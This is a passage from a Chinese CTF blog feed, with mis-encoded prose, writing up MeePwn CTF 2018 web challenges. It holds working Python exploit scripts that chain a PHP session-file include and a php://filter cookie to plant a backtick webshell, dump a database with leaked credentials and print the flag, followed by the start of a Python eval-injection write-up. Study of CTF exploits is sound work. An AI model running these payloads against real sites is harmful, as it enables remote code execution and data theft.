Ôºå‰ΩÜ‰∏§Â§ÑÈÉΩÊòØÁî±<code>GET</code> Êàñ<code>POST</code> ‰º†ÁöÑÂèÇÔºåÂèÇÊï∞Ë¢´ÈªëÂêçÂçïËøáÊª§ÂØºËá¥Êó†Ê≥ïÁõ¥Êé•ÂèëÊå•‰ΩúÁî®„ÄÇ</p><p>ËÄÉËôëÂà∞COOKIEÊ≤°ÊúâË¢´ËøáÊª§ÔºåÂèØ‰ª•Áî®‰ΩúË∑≥ÊùøÔºåÂú®SessionÊñá‰ª∂‰∏≠ÂåÖÂê´CookieÔºåÂú®<code>command.txt</code> ÂÜôÂÖ•ÁºñÁ†ÅÂêéÁöÑÊó†ÂÆ≥Â≠óÁ¨¶‰∏≤ÔºåÂú®CookieÂÜôÂÖ•Âà©Áî®‰º™ÂçèËÆÆËØªÂèñ <code>command.txt</code>  Âπ∂Ëß£Á†ÅÁöÑËØ≠Âè•ÔºåÂ∞±ÊàêÂäüÂêëSessionÊñá‰ª∂ÂÜôÂÖ•‰∫Ü‰∏ÄÂè•ËØù„ÄÇ</p><p>ÂÖ∂ÂÆû‰ªéÂì™‰∏™Êñá‰ª∂ÁªèÁî±Âì™‰∏™ÂèòÈáèË∑≥Âà∞Âì™‰∏™Êñá‰ª∂ÊòØÊúâÂ§öÁßçÂèØËÉΩÁöÑÔºå‰ΩÜÊú¨È¢òÂèóÈôê‰∫éÈïøÂ∫¶ËøôÂæàÂèØËÉΩÊòØÂîØ‰∏ÄÁöÑËß£Ê≥ï„ÄÇ</p><h3 id="Ê≠•È™§"><a href="#Ê≠•È™§" class="headerlink" title="Ê≠•È™§"></a>Ê≠•È™§</h3><ul><li>Âú®SETTINGÂ§Ñ‰øÆÊîπÁî®Êà∑Âêç‰∏∫<code>&lt;?=include&quot;$_COOKIE[a]</code> </li><li>Âú®FiddlerÁöÑFiltersÂ§ÑÁöÑCookieÂêéÈù¢Ê∑ªÂä†‰∏ä‰∏ÄÊù°<code>a=php://filter/convert.base64-decode/resource=upload/ac8d37347a056bad2a852e4ef40de28a/command.txt</code></li><li>Âú®characterÂ§ÑÁªôÂÆ†Áâ©Âèë‰∏ÄÊù°ÂëΩ‰ª§ <code>PD89YCRfR0VUW2ZdYDs</code> ‰ªéËÄåÂÜôÂÖ•<code>command.txt</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PD89YCRfR0VUW2ZdYDs ÂèØËß£Á†Å‰∏∫ &lt;?=`$_GET[f]`;</span></span><br></pre></td></tr></table></figure><p><img src="1532072718776.png" alt="1532072718776"></p><ul><li>Âú®adminÂ§ÑÁªôËá™Â∑±ÈÄÅ‰∏ÄÂè™ÂÆ†Áâ©</li></ul><p><img src="1532072632523.png" alt="1532072632523"></p><p>‰ΩøÊâßË°åËØ≠Âè•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] gave '</span>.$_POST[<span class="string">'pet'</span>].<span class="string">' to player '</span>.search_name_by_mail($conn,$_POST[<span class="string">'email'</span>]);</span><br></pre></td></tr></table></figure><p>ËÄåÂÖ∂‰∏≠ÁöÑ<code>search_name_by_mail($conn,$_POST[&#39;email&#39;]</code> Ê≠£ÊòØÁî®Êà∑Âêç<code>&lt;?=include&quot;$_COOKIE[a]</code> </p><p>ÊâÄ‰ª•ÂåÖÂê´sessionÊñá‰ª∂Â∞±ÂèØ‰ª•ÊääCookieÈáåÁöÑÂèòÈáèa ÂåÖÂê´ËøõÊù•ÔºåËÄåaÂèàÊòØcommand.txtËß£Á†ÅÂêéÁöÑÁªìÊûúÔºå‰πüÂ∞±ÊòØ‰∏ÄÂè•ËØùÊú®È©¨„ÄÇËøôÊó∂Â∞±ÂèØ‰ª•‰ª•f‰∏∫ÂØÜÁ†Å‰º†ÂÖ•‰ªªÊÑèÂëΩ‰ª§‰∫Ü„ÄÇ</p><ul><li>ËØªÂà∞Êï∞ÊçÆÂ∫ìÈÖçÁΩÆÊñá‰ª∂</li></ul><p><img src="1532073478518.png" alt="1532073478518"></p><ul><li>ËØªÂà∞ÈÖçÁΩÆÊñá‰ª∂dbconnect.php </li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'DBHOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'DBUSER'</span>, <span class="string">'mapl_story_user'</span>);</span><br><span class="line">define(<span class="string">'DBPASS'</span>, <span class="string">'tsu_tsu_tsu_tsu'</span>); </span><br><span class="line">define(<span class="string">'DBNAME'</span>, <span class="string">'mapl_story'</span>);</span><br><span class="line">$conn = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME);</span><br><span class="line"><span class="keyword">if</span> ( !$conn ) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Connection failed : "</span> . mysql_error());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ÁÑ∂ÂêéÊâßË°åÂëΩ‰ª§</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &apos;SELECT * FROM mapl_config;&apos;| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br><span class="line">Êàñ</span><br><span class="line">mysql -e&apos;select * from mapl_config&apos; -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story</span><br></pre></td></tr></table></figure><p><img src="1532073884330.png" alt="1532073884330"></p><h3 id="ËÑöÊú¨"><a href="#ËÑöÊú¨" class="headerlink" title="ËÑöÊú¨"></a>ËÑöÊú¨</h3><p>‰πüÂèØÂèÇËÄÉËÑöÊú¨ÁêÜÊ∏ÖÂà©Áî®ËøáÁ®ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span><span class="params">(user_email)</span>:</span></span><br><span class="line">    payload = dict(pet=<span class="string">"babydragon"</span>, email=user_email, submit=<span class="string">"Give"</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">'?page=admin.php'</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(cmd=<span class="string">"testcmd"</span>)</span>:</span></span><br><span class="line">    payload = dict(command=cmd, submit=<span class="string">"Send"</span>)</span><br><span class="line">    r = requests.post(</span><br><span class="line">        url + <span class="string">"?page=character.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(cmd=<span class="string">'uname'</span>)</span>:</span></span><br><span class="line">    payload = dict(</span><br><span class="line">        page=<span class="string">"/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie['PHPSESSID'] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">user_email = <span class="string">"ojbk@qq.com"</span></span><br><span class="line">salt = <span class="string">'ms_g00d_0ld_g4m3'</span></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'8es749ivbfetvsmsc0ggthr2e5'</span>,</span><br><span class="line">    _role=<span class="string">'a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054'</span>,</span><br><span class="line">    a=<span class="string">"php://filter/convert.base64-decode/resource=upload/%s/command.txt"</span> %</span><br><span class="line">    hashlib.md5(salt + user_email).hexdigest())</span><br><span class="line">change_name(<span class="string">'&lt;?=include"$_COOKIE[a]'</span>)</span><br><span class="line"><span class="comment"># ‰øÆÊîπÁî®Êà∑Âêç‰ΩøËØªSessionÊñá‰ª∂Êó∂ÂåÖÂê´ËøõCookie['a']ÔºåÂç≥command.txtÂæóbase64Ëß£Á†Å</span></span><br><span class="line">cmd = base64.b64encode(<span class="string">"&lt;?=`$_GET[f]`;"</span>)  <span class="comment">#'PD89YCRfR0VUW2ZdYDs='</span></span><br><span class="line">command(cmd[:<span class="number">19</span>])  <span class="comment"># ÂæÄcommand.txtÂÜôÂÖ•base64ÁºñÁ†ÅÁöÑshellÔºåÁº∫Â∞ëÊúÄÂêé‰∏Ä‰∏™Á≠âÂè∑‰πüÂèØÊ≠£Â∏∏Ëß£Á†Å</span></span><br><span class="line">give_pet(user_email)  <span class="comment"># ‰ΩøSessionÊñá‰ª∂‰∏≠ÁöÑactionÂÄº‰∏∫"Give $pet to  player $username"</span></span><br><span class="line">cmd = <span class="string">"mysql -e'select * from mapl_config' -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story"</span></span><br><span class="line"><span class="keyword">print</span> shell(cmd)</span><br><span class="line"><span class="comment"># mapl_salt      mapl_key        mapl_now_get_your_flag</span></span><br><span class="line"><span class="comment"># ms_g00d_0ld_g4m3        You_Never_Guess_This_Tsug0d_1337        MeePwnCTF&#123;__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___&#125;</span></span><br></pre></td></tr></table></figure><h1 id="Âè¶‰∏ÄÁßçÊÄùË∑ØÔºöÊãºÊé•-SESSION-ÂèòÈáè"><a href="#Âè¶‰∏ÄÁßçÊÄùË∑ØÔºöÊãºÊé•-SESSION-ÂèòÈáè" class="headerlink" title="Âè¶‰∏ÄÁßçÊÄùË∑ØÔºöÊãºÊé•$_SESSION ÂèòÈáè"></a>Âè¶‰∏ÄÁßçÊÄùË∑ØÔºöÊãºÊé•<code>$_SESSION</code> ÂèòÈáè</h1><p>Âè¶Â§ñÔºå <a href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html" target="_blank" rel="noopener">ËøôÁØáÊñáÁ´†</a> ÈáåÊèê‰æõÁöÑ‰∏ÄÁßçÊãºÊé•<code>$_SESSION</code> ÂèòÈáèÁöÑÂÅöÊ≥ïËôΩ‰∏çÊØîÂâçËÄÖÁªºÂêàÂà©Áî®Â§öÂ§ÑÁº∫Èô∑ÁöÑ‰ºòÈõÖÔºå‰ΩÜÊúÄÂ§ßÂåñÂú∞Âà©Áî®‰∫ÜÂçïÁÇπÁöÑÁº∫Èô∑ÔºåÂæàÊúâÂàõÊÑèÔºåÂÄºÂæóÂ≠¶‰π†„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, hashlib, base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_pet</span><span class="params">(user_email)</span>:</span></span><br><span class="line">    payload = dict(pet=<span class="string">"babydragon"</span>, email=user_email, submit=<span class="string">"Give"</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">'?page=admin.php'</span>, cookies=cookie, data=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">(cmd=<span class="string">'uname'</span>)</span>:</span></span><br><span class="line">    payload = dict(</span><br><span class="line">        page=<span class="string">"/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>], f=cmd)</span><br><span class="line">    r = requests.get(url, cookies=cookie, params=payload)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># edit your cookie['PHPSESSID'] &amp; user_email to run this script</span></span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">user_email = <span class="string">"mapl@qq.com"</span></span><br><span class="line">salt = <span class="string">'ms_g00d_0ld_g4m3'</span></span><br><span class="line"></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'8es749ivbfetvsmsc0ggthr2e5'</span>,</span><br><span class="line">    _role=<span class="string">'a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054'</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do</span><span class="params">(s)</span>:</span></span><br><span class="line">    change_name(s)</span><br><span class="line">    give_pet(user_email)</span><br><span class="line">    <span class="keyword">print</span> s</span><br><span class="line">    <span class="keyword">print</span> shell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]='*/'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=';'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='"'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='&lt;'?&gt;</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='?'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='='/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=' '/*</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'`echo PD89YCRfR0VUWzFdYDsK|base64 -d &gt;&gt; upload/%s/command.txt`'</span> % hashlib.md5(</span><br><span class="line">    salt + user_email).hexdigest()</span><br><span class="line">payload3 = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].=''/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='?'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a].='&gt;'/*</span></span><br><span class="line"><span class="string">&lt;?=$_SESSION[a]?&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxx</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload1.split(<span class="string">'\n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> payload2:</span><br><span class="line">        p = <span class="string">"&lt;?=$_SESSION[a].='%s'/*"</span> % c</span><br><span class="line">        do(p)</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payload3.split(<span class="string">'\n'</span>)[<span class="number">1</span>:<span class="number">-1</span>]:</span><br><span class="line">        do(p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xxx()</span><br><span class="line"><span class="keyword">print</span> hashlib.md5(salt + user_email).hexdigest()</span><br><span class="line"><span class="comment"># ÂèØÈÄöËøáËøêË°åÁªìÊûúÁêÜËß£payloadÁöÑÂ∑ßÂ¶ô</span></span><br><span class="line"><span class="comment"># ÁªìÊûúÂ≠òÊîæÂú®</span></span><br><span class="line"><span class="comment"># https://github.com/findneo/ctfgodown/blob/master/20180718-Meepwn%20CTF%20Quals%202018/WEB/maplStory_SESSION_CONCAT_result.txt</span></span><br><span class="line"><span class="comment"># shell at </span></span><br><span class="line"><span class="comment"># http://178.128.87.16/?page=upload/e500ec6d3d2b69fda8ff11b5b53b5ee2/command.txt&amp;1=ls</span></span><br></pre></td></tr></table></figure><p><img src="1532114006803.png" alt="1532114006803"></p><h1 id="ÂèÇËÄÉÈìæÊé•"><a href="#ÂèÇËÄÉÈìæÊé•" class="headerlink" title="ÂèÇËÄÉÈìæÊé•"></a>ÂèÇËÄÉÈìæÊé•</h1><p><a href="https://ctftime.org/writeup/10418" target="_blank" rel="noopener">https://ctftime.org/writeup/10418</a> </p><p><a href="https://movrment.blogspot.com/2018/07/meepwn-ctf-2018-qual-maple-s.html" target="_blank" rel="noopener">MeePwn CTF 2018 Qual - Maple Story</a>   </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Êú¨ÊñáÈ¶ñÂèë &lt;a href=&quot;https://xz.aliyun.com/t/2463&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;ÂÖàÁü•Á§æÂå∫&lt;/a&gt; ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÈìæÊé•„ÄÇ&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;Êú¨È¢òËÄÉÂØüPHPÊ∫êÁ†ÅÂÆ°ËÆ°„ÄÇ‰∏ªË¶ÅÊúâ‰∏§‰∏™Áº∫
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Meepwn2018ÔºöPyCalx&amp;PyCalx2‚Äî‚ÄîPython3ÁöÑf-string‰∏éevalÊ≥®ÂÖ•</title>
    <link href="https://findneo.github.io/180719MeePwn_py3Inject/"/>
    <id>https://findneo.github.io/180719MeePwn_py3Inject/</id>
    <published>2018-07-19T01:10:50.000Z</published>
    <updated>2019-01-25T23:21:37.026Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Êú¨ÊñáÈ¶ñÂèë <a href="https://xz.aliyun.com/t/2446" target="_blank" rel="noopener">ÂÖàÁü•Á§æÂå∫</a> ÔºåËΩ¨ËΩΩËØ∑Ê≥®ÊòéÈìæÊé•„ÄÇ</strong> </p><h1 id="PyCalx"><a href="#PyCalx" class="headerlink" title="PyCalx"></a>PyCalx</h1><blockquote><p>This code is supposed to be unexploitable :/ another pyjail?<br><a href="http://178.128.96.203/cgi-bin/server.py?source=1" target="_blank" rel="noopener">[Source]</a><br><a href="http://178.128.96.203/cgi-bin/server.py?value1=123&amp;op=%3D%3D&amp;value2=123" target="_blank" rel="noopener">Try this </a>or <a href="http://178.128.96.203/cgi-bin/server.py?value1=abc&amp;op=%3D%3D&amp;value2=abc" target="_blank" rel="noopener">this</a><br>Notice: The flag may contain non alphabetic characters (but still printable)</p></blockquote><p>Êú¨È¢òÁî±PythonÁöÑ <code>eval()</code> ÂáΩÊï∞ÂèÇÊï∞ÂèØÊéß‰∏îÁõ¥Êé•ÊãºÊé•ÂºïÂèëÁöÑÊ≥®ÂÖ•ÔºåÈááÁî®‰∫åÂàÜÊ≥ïÁõ≤Ê≥®„ÄÇ</p><p>server.pyÊ∫êÁ†ÅÂ¶Ç‰∏ãÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> cgi</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = open(<span class="string">'/var/www/flag'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">OK_200 = <span class="string">"some HTML code"</span></span><br><span class="line">print(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'source'</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">'source'</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">'1'</span>:</span><br><span class="line">    print(<span class="string">'&lt;pre&gt;'</span> + escape(str(open(__file__, <span class="string">'r'</span>).read())) + <span class="string">'&lt;/pre&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'value1'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'value2'</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">'op'</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> str(val).isdigit(): <span class="keyword">return</span> int(val)</span><br><span class="line">        blacklist = [<span class="string">'('</span>, <span class="string">')'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'\''</span>,</span><br><span class="line">                     <span class="string">'"'</span>]  <span class="comment"># I don't like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid value&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_op</span><span class="params">(val)</span>:</span></span><br><span class="line">        val = str(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">'+'</span>, <span class="string">'-'</span>, <span class="string">'/'</span>, <span class="string">'*'</span>, <span class="string">'='</span>, <span class="string">'!'</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">''</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            print(<span class="string">'&lt;center&gt;Invalid op&lt;/center&gt;'</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">'op'</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">'value1'</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">'value2'</span>].value)</span><br><span class="line">    <span class="keyword">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class="line">        print(<span class="string">'&lt;center&gt;Types of the values don\'t match&lt;/center&gt;'</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class="line">    print(</span><br><span class="line">        <span class="string">'&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class="col-md-8"&gt;&lt;pre&gt;'</span></span><br><span class="line">    )</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt;&gt; print('</span> + escape(calc_eval) + <span class="string">')'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = str(eval(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">'True'</span> <span class="keyword">or</span> result == <span class="string">'False'</span>:</span><br><span class="line">            print(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(</span><br><span class="line">                <span class="string">"Invalid"</span></span><br><span class="line">            )  <span class="comment"># Sorry we don't support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"Invalid"</span>)</span><br><span class="line">    print(<span class="string">'&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;'</span>)</span><br></pre></td></tr></table></figure><p>Â§ßÊÑèÂ¶Ç‰∏ãÔºö</p><ul><li>cgi‰ºöÂ§ÑÁêÜsourceÔºåvalue1Ôºåvalue2ÔºåopÂõõ‰∏™ÂèÇÊï∞„ÄÇ</li><li>Â¶ÇÊûúsource=1ÂàôÊâìÂç∞Ê∫ê‰ª£Á†Å„ÄÇ</li><li>value1Ôºåvalue2Ôºåop‰∏â‰∏™ÂèÇÊï∞ÈÉΩÊúâÂÄºÊó∂Ëøõ‰∏ÄÊ≠•Â§ÑÁêÜ„ÄÇ<ul><li>value1Ôºåvalue2Ëá≥Â∞ë1‰∏™Â≠óÁ¨¶ÔºåËá≥Â§ö64‰∏™Ôºå‰∏î‰∏çÂåÖÂê´ÈªëÂêçÂçï<code>()[]&#39;&quot;</code> 